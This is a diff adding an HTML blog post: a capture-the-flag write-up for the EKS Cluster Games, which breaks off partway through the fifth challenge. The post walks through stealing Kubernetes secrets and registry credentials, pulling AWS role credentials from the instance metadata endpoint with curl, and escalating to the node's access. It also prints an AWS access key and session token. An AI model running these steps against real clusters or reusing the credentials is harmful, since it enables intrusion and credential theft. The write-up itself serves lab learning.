@@ -1,0 +1,848 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta http-equiv="Accept-CH" content="DPR, Viewport-Width, Width">
+<link rel="icon" href="/images/logo.png" type="image/gif">
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload"
+      as="style"
+      href="https://fonts.googleapis.com/css2?family=Alata&family=Lora:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600;1,700&family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"
+>
+<link rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=Alata&family=Lora:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600;1,700&family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"
+      media="print" onload="this.media='all'" />
+<noscript>
+  <link
+          href="https://fonts.googleapis.com/css2?family=Alata&family=Lora:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600;1,700&family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"
+          rel="stylesheet">
+</noscript>
+
+
+<link rel="stylesheet" href="/css/font.css" media="all">
+
+
+
+<meta property="og:title" content="EKS Cluster Games All Solution" />
+<meta property="og:description" content="Detailed solutions for the EKS Cluster Games, covering Kubernetes secrets, registry hunting, and ECR image analysis." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lychnobyte.my.id/blogs/eks-cluster-games-all-solution/" /><meta property="article:section" content="blogs" />
+<meta property="article:published_time" content="2025-09-16T00:00:00+00:00" />
+<meta property="article:modified_time" content="2025-09-16T00:00:00+00:00" /><meta property="og:site_name" content="Ahmad Fauzzan Maghribi" />
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="EKS Cluster Games All Solution"/>
+<meta name="twitter:description" content="Detailed solutions for the EKS Cluster Games, covering Kubernetes secrets, registry hunting, and ECR image analysis."/>
+
+
+
+
+
+<link rel="stylesheet" href="/bootstrap-5/css/bootstrap.min.css" media="all"><link rel="stylesheet" href="/css/header.css" media="all">
+<link rel="stylesheet" href="/css/language-switcher.css" media="all">
+<link rel="stylesheet" href="/css/footer.css" media="all">
+
+
+<link rel="stylesheet" href="/css/theme.css" media="all">
+
+<style>
+    :root {
+        --text-color: #343a40;
+        --text-secondary-color: #6c757d;
+        --text-link-color: #007bff;
+        --background-color: #eaedf0;
+        --secondary-background-color: #64ffda1a;
+        --primary-color: #007bff;
+        --secondary-color: #f8f9fa;
+
+         
+        --text-color-dark: #e4e6eb;
+        --text-secondary-color-dark: #b0b3b8;
+        --text-link-color-dark: #ffffff;
+        --background-color-dark: #18191a;
+        --secondary-background-color-dark: #212529;
+        --primary-color-dark: #ffffff;
+        --secondary-color-dark: #212529;
+    }
+    body {
+        font-size: 1rem;
+        font-weight: 400;
+        line-height: 1.5;
+        text-align: left;
+    }
+
+    html {
+        background-color: var(--background-color) !important;
+    }
+
+    body::-webkit-scrollbar {
+        height: 0px;
+        width: 8px;
+        background-color: var(--background-color);
+    }
+
+    ::-webkit-scrollbar-track {
+        border-radius: 1rem;
+    }
+
+    ::-webkit-scrollbar-thumb {
+        border-radius: 1rem;
+        background: #b0b0b0;
+        outline: 1px solid var(--background-color);
+    }
+
+    #search-content::-webkit-scrollbar {
+        width: .5em;
+        height: .1em;
+        background-color: var(--background-color);
+    }
+</style>
+
+
+
+<meta name="description" content="Detailed solutions for the EKS Cluster Games, covering Kubernetes secrets, registry hunting, and ECR image analysis.">
+<link rel="stylesheet" href="/css/single.css">
+
+
+<script defer src="/fontawesome-6/all-6.4.2.js"></script>
+
+
+  
+  
+
+  <title>
+EKS Cluster Games All Solution | Ahmad Fauzzan Maghribi
+
+  </title>
+</head>
+
+<body class="light">
+  
+  
+<script>
+    let localStorageValue = localStorage.getItem("pref-theme");
+    let mediaQuery = window.matchMedia('(prefers-color-scheme: dark)').matches;
+
+    switch (localStorageValue) {
+        case "dark":
+            document.documentElement.classList.add('dark');
+            document.body.classList.add('dark');
+            break;
+        case "light":
+            document.body.classList.remove('dark');
+            document.documentElement.classList.remove('dark');
+            break;
+        default:
+            if (mediaQuery) {
+                document.documentElement.classList.add('dark');
+                document.body.classList.add('dark');
+            }
+            break;
+    }
+</script>
+
+
+
+
+<script>
+    var prevScrollPos = window.pageYOffset;
+    window.addEventListener("scroll", function showHeaderOnScroll() {
+        let profileHeaderElem = document.getElementById("profileHeader");
+        let currentScrollPos = window.pageYOffset;
+        let resetHeaderStyle = false;
+        let showNavBarOnScrollUp =  true ;
+        let showNavBar = showNavBarOnScrollUp ? prevScrollPos > currentScrollPos : currentScrollPos > 0;
+        if (showNavBar) {
+            profileHeaderElem.classList.add("showHeaderOnTop");
+        } else {
+            resetHeaderStyle = true;
+        }
+        if(currentScrollPos === 0) {
+            resetHeaderStyle = true;
+        }
+        if(resetHeaderStyle) {
+            profileHeaderElem.classList.remove("showHeaderOnTop");
+        }
+        prevScrollPos = currentScrollPos;
+    });
+</script>
+
+
+
+<header id="profileHeader">
+    <nav class="pt-3 navbar navbar-expand-lg animate">
+        <div class="container-fluid mx-xs-2 mx-sm-5 mx-md-5 mx-lg-5">
+            
+            <a class="navbar-brand primary-font text-wrap" href="/">
+                
+                <img src="/images/logo.png" width="30" height="30"
+                    class="d-inline-block align-top">
+                afmaghribi
+                
+            </a>
+
+            
+                <div>
+                    <input id="search" autocomplete="off" class="form-control mr-sm-2 d-none d-md-block" placeholder='Search...'
+                        aria-label="Search" oninput="searchOnChange(event)">
+                </div>
+            
+
+            
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarContent"
+                aria-controls="navbarContent" aria-expanded="false" aria-label="Toggle navigation">
+                <svg aria-hidden="true" height="24" viewBox="0 0 16 16" version="1.1" width="24" data-view-component="true">
+                    <path fill-rule="evenodd" d="M1 2.75A.75.75 0 011.75 2h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 2.75zm0 5A.75.75 0 011.75 7h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 7.75zM1.75 12a.75.75 0 100 1.5h12.5a.75.75 0 100-1.5H1.75z"></path>
+                </svg>
+            </button>
+
+            
+            <div class="collapse navbar-collapse text-wrap primary-font" id="navbarContent">
+                <ul class="navbar-nav ms-auto text-center">
+                    
+                        <li class="nav-item navbar-text d-block d-md-none">
+                            <div class="nav-link">
+                                <input id="search" autocomplete="off" class="form-control mr-sm-2" placeholder='Search...' aria-label="Search" oninput="searchOnChange(event)">
+                            </div>
+                        </li>
+                    
+
+                    
+
+                    
+
+                    
+
+                    
+
+                    
+
+                    
+
+                    
+
+                    
+                    
+                    
+                    
+                    <li class="nav-item navbar-text">
+                        <a class="nav-link" href="/" title="Home">
+                            
+                            About Me
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    <li class="nav-item navbar-text">
+                        <a class="nav-link" href="/certifications" title="Professional Certifications">
+                            
+                            Certifications
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    <li class="nav-item navbar-text">
+                        <a class="nav-link" href="/blogs" title="Blog posts">
+                            
+                            Blog
+                        </a>
+                    </li>
+                    
+                    
+
+                    <li class="nav-item navbar-text">
+                        
+                        <div class="text-center">
+                            <button id="theme-toggle" type="button" aria-label="Toggle dark mode">
+                                <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                                </svg>
+                                <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                    <circle cx="12" cy="12" r="5"></circle>
+                                    <line x1="12" y1="1" x2="12" y2="3"></line>
+                                    <line x1="12" y1="21" x2="12" y2="23"></line>
+                                    <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                                    <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                                    <line x1="1" y1="12" x2="3" y2="12"></line>
+                                    <line x1="21" y1="12" x2="23" y2="12"></line>
+                                    <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                                    <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                                </svg>
+                            </button>
+                        </div>
+                    </li>
+                    
+
+                </ul>
+
+            </div>
+        </div>
+    </nav>
+</header>
+<div id="content">
+<section id="single">
+  <div class="container">
+    <div class="row justify-content-center">
+      <div class="col-sm-12 col-md-12 col-lg-9">
+        <div class="pr-lg-4">
+          <div class="title mb-5">
+            <h1 class="text-center mb-4">EKS Cluster Games All Solution</h1>
+            <div class="text-center">
+              
+                Lychnobyte
+                <small>|</small>
+              
+              Sep 16, 2025
+
+              
+              <span id="readingTime">
+                min read
+              </span>
+              
+            </div>
+          </div>
+          
+          <div class="featured-image">
+            <img class="img-fluid mx-auto d-block" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1753746016252/bc4ccf53-71e9-4372-aea1-d27d27cd610d.jpeg" alt="EKS Cluster Games All Solution">
+          </div>
+          
+          <article class="page-content  p-2">
+          <blockquote>
+<p><strong><em>Cover Illustration source</em></strong> <a href="https://www.pixiv.net/en/artworks/128345987">https://www.pixiv.net/en/artworks/128345987</a></p>
+</blockquote>
+<p>Helloo every-nyan ≽^•⩊•^≼</p>
+<p>Yet another post talk about cloud security challenges! This time specifically about kubernetes cluster that deployed using AWS EKS!</p>
+<p>The challenge still up and running at <a href="https://eksclustergames.com/">https://eksclustergames.com/</a></p>
+<p>This platform also using <code>wargames</code> style with 5 level challenges!</p>
+<p>So, without further ado let’s start to solve those challenges!</p>
+<h2 id="1-secret-seeker">1. Secret Seeker</h2>
+<p>First challenge description</p>
+<blockquote>
+<p>Jumpstart your quest by listing all the secrets in the cluster. Can you spot the flag among them?</p>
+</blockquote>
+<p>and kubernetes permission</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;secrets&#34;</span>: [
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;get&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;list&#34;</span>
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Well, pretty straightforward we just need to <code>list</code> and <code>get</code> secrets inside the kubernetes cluster.</p>
+<p>Just run these command in web shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl get secrets
+</span></span><span style="display:flex;"><span>kubectl get secrets log-rotate -oyaml
+</span></span></code></pre></div><p><img alt="Secrets List" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1753747753239/49b0c33f-5638-428a-bfbf-25f36207dd6f.png"></p>
+<p>There is one secrets <code>log-rotate</code> and when we read it contain <code>flag</code> variable with <code>base64</code> encoded string.</p>
+<p>To decode the <code>flag</code> you can just run this one-line command</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl get secrets log-rotate -ojsonpath<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;{.data.flag}&#39;</span> | base64 -d
+</span></span></code></pre></div><p><img alt="Flag decoded" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1753747892866/cf993e2f-141b-4696-9041-6b2c7c465070.png"></p>
+<h2 id="2-registry-hunt">2. Registry Hunt</h2>
+<p>Second challenges</p>
+<blockquote>
+<p>A thing we learned during our research: always check the container registries.</p>
+<p>For your convenience, the <a href="https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md"><strong>crane</strong></a> utility is already pre-installed on the machine.</p>
+</blockquote>
+<p>with kubernetes permission</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;secrets&#34;</span>: [
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;get&#34;</span>
+</span></span><span style="display:flex;"><span>    ],
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;pods&#34;</span>: [
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;list&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;get&#34;</span>
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Now we can only <code>get</code> secrets but we can <code>list</code> and <code>get</code> pods. So, i assume we need to know the exact secrets name from pod spec. Because secrets can attached to a pod.</p>
+<p>Run command below to find that secrets name</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl get pod
+</span></span><span style="display:flex;"><span>kubectl get pod database-pod-2c9b3a4e -oyaml
+</span></span></code></pre></div><p><img alt="Pod Details" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1753748538839/34780805-711c-46c8-9eed-63a2661f1527.png"></p>
+<p>As we can see there is secrets that used as authentication for pulling image in <code>imagePullSecrets</code> section named <code>registry-pull-secrets-780bab1d</code></p>
+<p>Lets’s check that secrets</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl get secret registry-pull-secrets-780bab1d -oyaml
+</span></span></code></pre></div><p><img alt="Registry Secrets" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1753748782943/f21afdfe-bd02-4d5e-a4bc-a287143db95b.png"></p>
+<p>Yap, it is a secrets that stored credential for authentication to image registry.</p>
+<p>To retrieve credential in plaintext use command below</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl get secret registry-pull-secrets-780bab1d -ojsonpath<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;{.data.\.dockerconfigjson}&#39;</span> | base64 -d <span style="color:#f92672">&amp;&amp;</span> echo
+</span></span><span style="display:flex;"><span>kubectl get secret registry-pull-secrets-780bab1d -ojsonpath<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;{.data.\.dockerconfigjson}&#39;</span> | base64 -d | jq <span style="color:#e6db74">&#39;.auths[&#34;index.docker.io/v1/&#34;].auth&#39;</span> | tr -d <span style="color:#e6db74">&#39;&#34;&#39;</span> | base64 -d <span style="color:#f92672">&amp;&amp;</span> echo
+</span></span></code></pre></div><p><img alt="Docker Config Decoded" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1753749003133/54c835f0-3e21-4e0b-a731-78410d3facd0.png"></p>
+<p>The credential pattern is <code>&lt;user&gt;:&lt;password&gt;</code></p>
+<p>Login with that credential using <code>crane</code> then <code>pull</code> the image that used in running pod</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crane auth login docker.io -u eksclustergames -p dckr_pat_REDACTED
+</span></span><span style="display:flex;"><span>crane pull eksclustergames/base_ext_image ./chall2.tar
+</span></span></code></pre></div><p><img alt="Crane Pull" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1753749292203/39835701-2936-405e-b287-f09ce18cdb71.png"></p>
+<p>Then extract the image <code>.tar</code> file to obtain <code>flag.txt</code></p>
+<p><img alt="Flag extraction" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1753749381393/9102ecb2-5ad2-40e5-9110-94a0521417f2.png"></p>
+<h2 id="3-image-inquisition">3. Image Inquisition</h2>
+<p>Third challenge</p>
+<blockquote>
+<p>A pod&rsquo;s image holds more than just code. Dive deep into its ECR repository, inspect the image layers, and uncover the hidden secret.</p>
+<p>Remember: You are running inside a compromised EKS pod.</p>
+</blockquote>
+<p>and kubernetes permission</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;pods&#34;</span>: [
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;list&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;get&#34;</span>
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Alright, i think we need to work with container image again. Let’s retrieve the image that running pod using.</p>
+<p><img alt="Image Info" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1753782916698/7a22c9d2-3e05-46c9-ad25-1aedf2e800ef.png"></p>
+<p>Well, pretty long image name and there is no <code>imagePullSecrets</code> value been set like previous challenge.</p>
+<p>So, how to authenticate to <code>ecr registry</code>? Well, as mentioned description we are inside compromised EKS pod. We can get some credentials using <code>IMDS</code> just like how usually we did in<code>EC2</code></p>
+<p>Get AWS credentials using command below</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://169.254.169.254/latest/meta-data/placement/region
+</span></span><span style="display:flex;"><span>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+</span></span><span style="display:flex;"><span>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole
+</span></span></code></pre></div><p><img alt="AWS Credentials" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1753783376116/75335c80-b070-4e19-a890-79f6f2057163.png"></p>
+<p>Set the credentials using export</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>export AWS_DEFAULT_REGION<span style="color:#f92672">=</span>&lt;region&gt;
+</span></span><span style="display:flex;"><span>export AWS_ACCESS_KEY_ID<span style="color:#f92672">=</span>&lt;AccessKeyId&gt;
+</span></span><span style="display:flex;"><span>export AWS_SECRET_ACCESS_KEY<span style="color:#f92672">=</span>&lt;SecretAccessKey&gt;
+</span></span><span style="display:flex;"><span>export AWS_SESSION_TOKEN<span style="color:#f92672">=</span>&lt;Token&gt;
+</span></span></code></pre></div><p>Then login to <code>ECR</code> registry using password that can be retrieve using <code>aws cli</code> .</p>
+<p>Well, you can easily do that with this one-line</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws ecr get-login-password | crane auth login --username AWS --password-stdin 688655246681.dkr.ecr.us-west-1.amazonaws.com
+</span></span></code></pre></div><p><img alt="ECR Login" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1753783708620/eb20643c-946c-4d68-aeb5-a170aa86ac5a.png"></p>
+<p>Then get the image digest layer to get flag using command below</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01 | jq .
+</span></span></code></pre></div><p><img alt="Crane Config" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1753784025594/631c4d43-e89e-4461-8681-cec7a1d9eaef.png"></p>
+<h2 id="4-pod-break">4. Pod Break</h2>
+<p>Forth challenge</p>
+<blockquote>
+<p>You&rsquo;re inside a vulnerable pod on an EKS cluster. Your pod&rsquo;s service-account has no permissions. Can you navigate your way to access the EKS Node&rsquo;s privileged service-account?</p>
+<p>Please be aware: Due to security considerations aimed at safeguarding the CTF infrastructure, the node has restricted permissions</p>
+</blockquote>
+<p>without any kubernetes permission :(</p>
+<p>But we can still retrieve AWS credentials using <code>IMDS</code> then set using export just like in previous challenge</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Get credential using IMDS</span>
+</span></span><span style="display:flex;"><span>curl http://169.254.169.254/latest/meta-data/placement/region
+</span></span><span style="display:flex;"><span>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+</span></span><span style="display:flex;"><span>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Set credential using export</span>
+</span></span><span style="display:flex;"><span>export AWS_DEFAULT_REGION<span style="color:#f92672">=</span>us-west-1
+</span></span><span style="display:flex;"><span>export AWS_ACCESS_KEY_ID<span style="color:#f92672">=</span>ASIA2AVYNEVMS7TN4SNY
+</span></span><span style="display:flex;"><span>export AWS_SECRET_ACCESS_KEY<span style="color:#f92672">=</span>4Kcs7G5L/JmbJdCr/e1+ee3qV0REcXWtUJBiLEVr
+</span></span><span style="display:flex;"><span>export AWS_SESSION_TOKEN<span style="color:#f92672">=</span>FwoGZXIvYXdzEI7//////////wEaDOoKIiUxvoQ0UIHjqyK3AXpAMgQHXeU5+PYF2kWqz88dQeCt0kZyzSh/USYSS8mDlWf04eQvumTbwR5gsyYZ6dZ0qQEyGqBoSMdto7udPz7h6raQ3nQ0Mnkn1O3CkyzD1xrLSNqV6MHQ9ljLSwW5jDYlHAKlWvnG5tAu1wLxTDMpeFMD5fXePA3nu97hxQ4Bap/ljIag7JmGjpsXXwjWlRjotVc8zfZC+VIcnPDFdv2qDyuxS+5Ozw2wvN+MaO6f8MVrkq5TASiQh6PEBjIt9xsnEa8adysXLHJUJxePXNjaisKb9+za5CeTXndhlanXjim+X19LJA6KDbLl
+</span></span></code></pre></div><p><img alt="AWS Node Credentials" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1753793483844/ce1405e2-4151-42fd-bd7b-79d064965c38.png"></p>
+<p>We can using our aws credential to generate token for accessing kubernetes cluster. But, before that we need to know <code>cluster-name</code> to do that.</p>
+<p>Well, <code>cluster-name</code> usually stored in kubectl config in <code>~/.kube/config</code> file.</p>
+<p><img alt="Kube Config" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1753793744008/092b7078-2bb9-4729-b3c2-2780a758bd2b.png"></p>
+<p>Cluster name is <code>localcfg</code> , ok now we can generate our token using command below</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws eks get-token --cluster-name localcfg
+</span></span></code></pre></div><p><img alt="EKS Token" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1753793988990/e54154de-7fe4-488d-bb0b-b0f387c07491.png"></p>
+<p>Then using that token as our authentication for <code>kubectl</code> to access the kubernetes cluster</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl --token $TOKEN auth can-i --list
+</span></span></code></pre></div><p><img alt="Kubectl Auth Check" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1753794024447/d07a0fc5-8a7f-45b5-9894-0e4ee4d51cd8.png"></p>
+<p>Well, well, well. The token doesn’t seems work :/</p>
+<p>Ok, maybe the <code>cluster name</code> we use is wrong.</p>
+<p>Let’s check our current aws credential, maybe there is a hint</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws sts get-caller-identity
+</span></span></code></pre></div><p><img alt="Caller Identity" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1753794776817/ac262a68-d4fd-41cb-8a94-efa62ac3ca06.png"></p>
+<p>Based on the IAM role name above we can guess the <code>cluster name</code> probably <code>eks-challenge-cluster</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws eks get-token --cluster-name eks-challenge-cluster
+</span></span><span style="display:flex;"><span>kubectl --token $TOKEN auth can-i --list
+</span></span></code></pre></div><p>Alright, now token is working. Yeay</p>
+<p><img alt="Kubectl Access Success" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1753795079504/05c629ea-1d6d-403f-8d92-66d3b62737ec.png"></p>
+<p>Well, we got permission <code>list</code> and <code>get</code> on resource <code>pods</code>, <code>secrets</code> and <code>serviceaccount</code>.</p>
+<p>Let’s check <code>secrets</code> because usually flag are stored there.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl --token $TOKEN get secret
+</span></span><span style="display:flex;"><span>kubectl --token $TOKEN get secret node-flag -oyaml
+</span></span><span style="display:flex;"><span>kubectl --token $TOKEN get secret node-flag -ojsonpath<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;{.data.flag}&#39;</span> | base64 -d
+</span></span></code></pre></div><p><img alt="Flag obtained" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1753795527131/8ac78acb-0e80-4b2b-b5fb-b092c546e7fb.png"></p>
+<p>Yap, the flag is there</p>
+<h2 id="5-container-secrets-infrastructure">5. Container Secrets Infrastructure</h2>
+<p>The last challenge</p>
+<blockquote>
+<p>You&rsquo;ve successfully transitioned from a limited Service Account to a Node Service Account! Great job. Your next challenge is to move from the EKS to the AWS account. Can you acquire the AWS role of the <em>s3access-sa</em> service account, and get the flag?</p>
+</blockquote>
+<p>And we got the IAM Policy</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;Policy&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;Statement&#34;</span>: [
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;Action&#34;</span>: [
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;s3:GetObject&#34;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;s3:ListBucket&#34;</span>
+</span></span><span style="display:flex;"><span>                ],
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;Effect&#34;</span>: <span style="color:#e6db74">&#34;Allow&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;Resource&#34;</span>: [
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;arn:aws:s3:::challenge-flag-bucket-3ff1ae2&#34;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag&#34;</span>
+</span></span><span style="display:flex;"><span>                ]
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        ],
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;Version&#34;</span>: <span style="color:#e6db74">&#34;2012-10-17&#34;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Trust policy</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;Version&#34;</span>: <span style="color:#e6db74">&#34;2012-10-17&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;Statement&#34;</span>: [
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;Effect&#34;</span>: <span style="color:#e6db74">&#34;Allow&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;Principal&#34;</span>: {
